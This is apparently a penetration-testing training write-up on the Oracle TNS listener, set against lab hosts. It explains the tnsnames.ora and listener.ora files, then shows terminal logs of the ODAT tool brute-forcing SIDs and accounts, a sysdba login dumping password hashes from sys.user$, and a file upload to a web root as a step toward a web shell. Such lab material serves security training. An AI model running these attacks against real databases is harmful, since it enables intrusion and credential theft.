
---

The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.

Over time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:

| **Name resolution** | **Connection management** | **Load balancing** | **Security** |
|---------------------|---------------------------|---------------------|--------------|

Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.

---

## Default Configuration

The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the `TCP/1521` port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.

The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.

Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one. Another example would be that many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:

#### Tnsnames.ora

Code: txt

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.

On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.

#### Listener.ora

Code: txt

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.

Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|




```
There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:

#### Oracle RDBMS - Interaction

Oracle RDBMS - Interaction

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.



```
%                                                         ➜  Downloads tar -xzf odat-linux-libc2.17-x86_64.tar.gz 
➜  Downloads cd odat-libc2.17-x86_64 
➜  odat-libc2.17-x86_64 ls
accounts
base_library.zip
Crypto
cx_Oracle.cpython-36m-x86_64-linux-gnu.so
libaio.so.1
libbz2.so.1
libclntshcore.so
libclntshcore.so.12.1
libclntsh.so
libclntsh.so.12.1
libcom_err.so.2
libcrypto.so.10
lib-dynload
libexpat.so.1
libffi.so.6
libfreebl3.so
libgssapi_krb5.so.2
libipc1.so
libk5crypto.so.3
libkeyutils.so.1
libkrb5.so.3
libkrb5support.so.0
liblzma.so.5
libmql1.so
libnnz12.so
libocci.so
libocci.so.12.1
libociei.so
libocijdbc12.so
libons.so
liboramysql12.so
libpcap.so.1
libpcre.so.1
libpython3.6m.so.1.0
libreadline.so.6
libselinux.so.1
libsqlplusic.so
libsqlplus.so
libssl.so.10
libtinfo.so.5
libz.so.1
odat-libc2.17-x86_64
resources
➜  odat-libc2.17-x86_64 ./odat-libc2.17-x86_64 
18:30:28 CRITICAL -: Target(s) has to be given (with '-s IPadress' for example)
➜  odat-libc2.17-x86_64 ./odat-libc2.17-x86_64 -h
usage: odat-libc2.17-x86_64 [-h] [--version]
                            {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
                            ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)

positional arguments:
  {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
                      
                      Choose a main command
    all               to run all modules in order to know what it is possible to do
    tnscmd            to communicate with the TNS listener
    tnspoison         to exploit TNS poisoning attack (SID required)
    sidguesser        to know valid SIDs
    snguesser         to know valid Service Name(s)
    passwordguesser   to know valid credentials
    utlhttp           to send HTTP requests or to scan ports
    httpuritype       to send HTTP requests or to scan ports
    utltcp            to scan ports
    ctxsys            to read files
    externaltable     to read files or to execute system commands/scripts
    dbmsxslprocessor  to upload files
    dbmsadvisor       to upload files
    utlfile           to download/upload/delete files
    dbmsscheduler     to execute system commands without a standard output
    java              to execute system commands
    passwordstealer   to get hashed Oracle passwords
    oradbg            to execute a bin or script
    dbmslob           to download files
    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
    smb               to capture the SMB authentication
    privesc           to gain elevated access
    cve               to exploit a CVE
    search            to search in databases, tables and columns
    unwrapper         to unwrap PL/SQL source code (no for 9i version)
    clean             clean traces and logs

optional arguments:
  -h, --help          show this help message and exit
  --version           show program's version number and exit
➜  odat-libc2.17-x86_64 ./odat-libc2.17-x86_64 all -s 10.129.205.19
[+] Checking if target 10.129.205.19:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.205.19:1521 is well configured. Continue...

[1] (10.129.205.19:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.205.19:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.205.19:1521 server
[+] 'XE' is a valid SID. Continue...                            ################################# | ETA:  00:00:01 
100% |############################################################################################| Time: 00:02:41 
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |############################################################################################| Time: 00:00:05 
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid SID. Continue...                            #######################           | ETA:  00:00:15 
100% |############################################################################################| Time: 00:02:26 
[+] SIDs found on the 10.129.205.19:1521 server: XE

[3] (10.129.205.19:1521): Searching valid Service Names
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.205.19:1521 server
[+] 'XE' is a valid Service Name. Continue...                   ################################# | ETA:  00:00:01 
[+] 'XEXDB' is a valid Service Name. Continue...                
100% |############################################################################################| Time: 00:02:41 
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.205.19:1521)
100% |############################################################################################| Time: 00:00:05 
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.205.19:1521)
[+] 'XE' is a valid Service Name. Continue...                   #######################           | ETA:  00:00:15 
100% |############################################################################################| Time: 00:02:24 
[+] Service Name(s) found on the 10.129.205.19:1521 server: XE,XEXDB
[!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice

[4] (10.129.205.19:1521): Searching valid accounts on the XE SID
The login cis has already been tested at least once. What do you want to do:                      | ETA:  00:08:45 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                    | ETA:  00:09:50 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                    | ETA:  00:09:27 
[!] Notice: 'dip' account is locked, so skipping this username for password                       | ETA:  00:08:57 
[!] Notice: 'hr' account is locked, so skipping this username for password                        | ETA:  00:07:15 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                     | ETA:  00:05:33 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password                | ETA:  00:04:20 
[!] Notice: 'outln' account is locked, so skipping this username for password                     | ETA:  00:03:53 
[+] Valid credentials found: scott/tiger. Continue...           ###############                   | ETA:  00:02:09 
[!] Notice: 'xdb' account is locked, so skipping this username for password###################    | ETA:  00:00:25 
100% |############################################################################################| Time: 00:10:41 
[+] Accounts found on 10.129.205.19:1521/sid:XE: 
scott/tiger


[5] (10.129.205.19:1521): Searching valid accounts on the XEXDB Service Name
The login abm has already been tested at least once. What do you want to do:                      | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                    | ETA:  00:09:35 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                    | ETA:  00:09:11 
[!] Notice: 'dip' account is locked, so skipping this username for password                       | ETA:  00:08:38 
[!] Notice: 'hr' account is locked, so skipping this username for password                        | ETA:  00:07:02 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                     | ETA:  00:05:23 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password                | ETA:  00:04:10 
[!] Notice: 'outln' account is locked, so skipping this username for password                     | ETA:  00:03:44 
[+] Valid credentials found: scott/tiger. Continue...           ###############                   | ETA:  00:02:03 
[!] Notice: 'xdb' account is locked, so skipping this username for password###################    | ETA:  00:00:24 
100% |############################################################################################| Time: 00:10:11 
[+] Accounts found on 10.129.205.19:1521/serviceName:XEXDB: 
scott/tiger


[6] (10.129.205.19:1521): Testing all authenticated modules on sid:XE with the scott/tiger account
[6.1] UTL_HTTP library ?
[-] KO
[6.2] HTTPURITYPE library ?
19:04:34 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`
[-] KO
[6.3] UTL_FILE library ?
[-] KO
[6.4] JAVA library ?
[-] KO
[6.5] DBMSADVISOR library ?
[-] KO
[6.6] DBMSSCHEDULER library ?
[-] KO
[6.7] CTXSYS library ?
[-] KO
[6.8] Hashed Oracle passwords ?
[-] KO
[6.9] Hashed Oracle passwords with a view in ORACLE_OCM?
19:04:37 WARNING -: Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher
[-] KO
[-] KO
[6.10] Hashed Oracle passwords from history?
[-] KO
[6.11] DBMS_XSLPROCESSOR library ?
[-] KO
[6.12] External table to read files ?
[-] KO
[6.13] External table to execute system commands ?
[-] KO
[6.14] Oradbg ?
[-] KO
[6.15] DBMS_LOB to read files ?
[-] KO
[6.16] SMB authentication capture ?
[-] KO
[6.17] Gain elevated access (privilege escalation)?
[6.17.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[-] KO
[6.17.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[6.17.3] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[6.17.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[6.17.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[6.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[6.19] Create file on target (CVE-2018-3004)?
[-] KO
[6.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database

[7] (10.129.205.19:1521): Oracle users have not the password identical to the username ?
[!] Notice: 'XS$NULL' account is locked, so skipping this username for password                   | ETA:  00:00:00 
The login XS$NULL has already been tested at least once. What do you want to do:                  | ETA:  00:00:19 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'APEX_040000' account is locked, so skipping this username for password               | ETA:  00:03:39 
[!] Notice: 'APEX_PUBLIC_USER' account is locked, so skipping this username for password          | ETA:  00:02:30 
[!] Notice: 'FLOWS_FILES' account is locked, so skipping this username for password               | ETA:  00:01:50 
[!] Notice: 'HR' account is locked, so skipping this username for password                        | ETA:  00:01:25 
[!] Notice: 'MDSYS' account is locked, so skipping this username for password                     | ETA:  00:01:07 
[!] Notice: 'XDB' account is locked, so skipping this username for password                       | ETA:  00:00:45 
[!] Notice: 'CTXSYS' account is locked, so skipping this username for password                    | ETA:  00:00:36 
[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password                 | ETA:  00:00:29 
[!] Notice: 'DBSNMP' account is locked, so skipping this username for password                    | ETA:  00:00:23 
[!] Notice: 'ORACLE_OCM' account is locked, so skipping this username for password                | ETA:  00:00:17 
[!] Notice: 'DIP' account is locked, so skipping this username for password####                   | ETA:  00:00:13 
[!] Notice: 'OUTLN' account is locked, so skipping this username for password#######              | ETA:  00:00:08 
100% |############################################################################################| Time: 00:01:01 
[-] No found a valid account on 10.129.205.19:1521/sid:XE with usernameLikePassword module

[8] (10.129.205.19:1521): Testing all authenticated modules on ServiceName:XEXDB with the scott/tiger account
[8.1] UTL_HTTP library ?
[-] KO
[8.2] HTTPURITYPE library ?
19:05:53 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`
[-] KO
[8.3] UTL_FILE library ?
[-] KO
[8.4] JAVA library ?
[-] KO
[8.5] DBMSADVISOR library ?
[-] KO
[8.6] DBMSSCHEDULER library ?
[-] KO
[8.7] CTXSYS library ?
[-] KO
[8.8] Hashed Oracle passwords ?
[-] KO
[8.9] Hashed Oracle passwords with a view in ORACLE_OCM?
19:05:54 WARNING -: Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher
[-] KO
[-] KO
[8.10] Hashed Oracle passwords from history?
[-] KO
[8.11] DBMS_XSLPROCESSOR library ?
[-] KO
[8.12] External table to read files ?
[-] KO
[8.13] External table to execute system commands ?
[-] KO
[8.14] Oradbg ?
[-] KO
[8.15] DBMS_LOB to read files ?
[-] KO
[8.16] SMB authentication capture ?
[-] KO
[8.17] Gain elevated access (privilege escalation)?
[8.17.6] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[-] KO
[8.17.7] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[8.17.8] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[8.17.9] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[8.17.10] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[8.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[8.19] Create file on target (CVE-2018-3004)?
[-] KO
[8.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database

[9] (10.129.205.19:1521): Oracle users have not the password identical to the username ?
The login XS$NULL has already been tested at least once. What do you want to do:                  | ETA:  00:00:00 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'XS$NULL' account is locked, so skipping this username for password
[!] Notice: 'APEX_040000' account is locked, so skipping this username for password               | ETA:  00:00:49 
[!] Notice: 'APEX_PUBLIC_USER' account is locked, so skipping this username for password          | ETA:  00:00:37 
[!] Notice: 'FLOWS_FILES' account is locked, so skipping this username for password               | ETA:  00:00:30 
[!] Notice: 'HR' account is locked, so skipping this username for password                        | ETA:  00:00:24 
[!] Notice: 'MDSYS' account is locked, so skipping this username for password                     | ETA:  00:00:21 
[!] Notice: 'XDB' account is locked, so skipping this username for password                       | ETA:  00:00:15 
[!] Notice: 'CTXSYS' account is locked, so skipping this username for password                    | ETA:  00:00:13 
[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password                 | ETA:  00:00:11 
[!] Notice: 'DBSNMP' account is locked, so skipping this username for password                    | ETA:  00:00:09 
[!] Notice: 'ORACLE_OCM' account is locked, so skipping this username for password                | ETA:  00:00:07 
[!] Notice: 'DIP' account is locked, so skipping this username for password####                   | ETA:  00:00:05 
[!] Notice: 'OUTLN' account is locked, so skipping this username for password#######              | ETA:  00:00:03 
100% |############################################################################################| Time: 00:00:35 
[-] No found a valid account on 10.129.205.19:1521/ServiceName:XEXDB with usernameLikePassword module
➜  odat-libc2.17-x86_64 

```

```
➜  oracle-instantclient-sqlplus git:(master) ✗ sqlplus scott/tiger@10.129.205.19/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Oct 2 19:07:00 2023
Version 21.11.0.0.0

Copyright (c) 1982, 2022, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_USER_ROLE		      YES YES NO
SYS			       AUTHENTICATEDUSER	      YES YES NO
SYS			       CONNECT			      YES YES NO
SYS			       CTXAPP			      YES YES NO
SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS			       DBA			      YES YES NO
SYS			       DBFS_ROLE		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       DELETE_CATALOG_ROLE	      YES YES NO
SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
SYS			       EXP_FULL_DATABASE	      YES YES NO
SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
SYS			       HS_ADMIN_ROLE		      YES YES NO
SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
SYS			       IMP_FULL_DATABASE	      YES YES NO
SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
SYS			       OEM_ADVISOR		      YES YES NO
SYS			       OEM_MONITOR		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       PLUSTRACE		      YES YES NO
SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
SYS			       RESOURCE 		      YES YES NO
SYS			       SCHEDULER_ADMIN		      YES YES NO
SYS			       SELECT_CATALOG_ROLE	      YES YES NO
SYS			       XDBADMIN 		      YES YES NO
SYS			       XDB_SET_INVOKER		      YES YES NO
SYS			       XDB_WEBSERVICES		      YES YES NO
SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.

SQL> select name, password from sys.user$;

NAME			       PASSWORD
------------------------------ ------------------------------
SYS			       FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM			       B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN			       4A3BA55E08595C81
EXP_FULL_DATABASE

NAME			       PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
DBFS_ROLE
DIP			       CE4A36B8E06CA59C
AQ_ADMINISTRATOR_ROLE
AQ_USER_ROLE
DATAPUMP_EXP_FULL_DATABASE
DATAPUMP_IMP_FULL_DATABASE
ADM_PARALLEL_EXECUTE_TASK
GATHER_SYSTEM_STATISTICS
XDB_WEBSERVICES_OVER_HTTP

NAME			       PASSWORD
------------------------------ ------------------------------
ORACLE_OCM		       5A2E026A9157958C
RECOVERY_CATALOG_OWNER
SCHEDULER_ADMIN
HS_ADMIN_SELECT_ROLE
HS_ADMIN_EXECUTE_ROLE
HS_ADMIN_ROLE
OEM_ADVISOR
OEM_MONITOR
DBSNMP			       E066D214D5421CCC
APPQOSSYS		       519D632B7EE7F63A
PLUSTRACE

NAME			       PASSWORD
------------------------------ ------------------------------
CTXSYS			       D1D21CA56994CAB6
CTXAPP
XDB			       E76A6BD999EF9FF1
ANONYMOUS		       anonymous
XDBADMIN
XDB_SET_INVOKER
AUTHENTICATEDUSER
XDB_WEBSERVICES
XDB_WEBSERVICES_WITH_PUBLIC
XS$NULL 		       DC4FCC8CB69A6733
_NEXT_USER

NAME			       PASSWORD
------------------------------ ------------------------------
MDSYS			       72979A94BAD2AF80
HR			       4C6D73C3E8B0F0DA
FLOWS_FILES		       30128982EA6D4A3D
APEX_PUBLIC_USER	       4432BA224E12410A
APEX_ADMINISTRATOR_ROLE
APEX_040000		       E7CE9863D7EEB0A4
SCOTT			       F894844C34402B67

51 rows selected.

SQL> exit
Disconnected from Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

```


Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

#### Oracle RDBMS - File Upload

Oracle RDBMS - File Upload

```shell-session
cdeez@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
cdeez@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

Oracle RDBMS - File Upload

```shell-session
cdeez@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```